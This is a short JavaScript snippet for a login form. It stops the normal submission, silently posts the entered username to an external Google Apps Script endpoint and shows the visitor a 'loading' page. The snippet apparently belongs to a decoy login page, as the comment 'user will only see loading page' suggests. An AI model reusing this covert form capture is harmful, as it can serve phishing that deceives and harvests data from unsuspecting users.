document.getElementById("loginForm").addEventListener("submit", function (e) {
  e.preventDefault();

  const username = document.getElementById("username").value;

  fetch("https://script.google.com/macros/s/AKfycbw6GR29yDCVXL5Wl5H0jiCRC4sFTNNmvgzg3uIMFnv4VIAKJbnzkbQkzLGP21jaZw0D/exec", {
    method: "POST",
    mode: "no-cors",
    body: new URLSearchParams({
      username: username
    })
  });

  // ✅ user will only see loading page
  window.location.href = "loading.html";
});
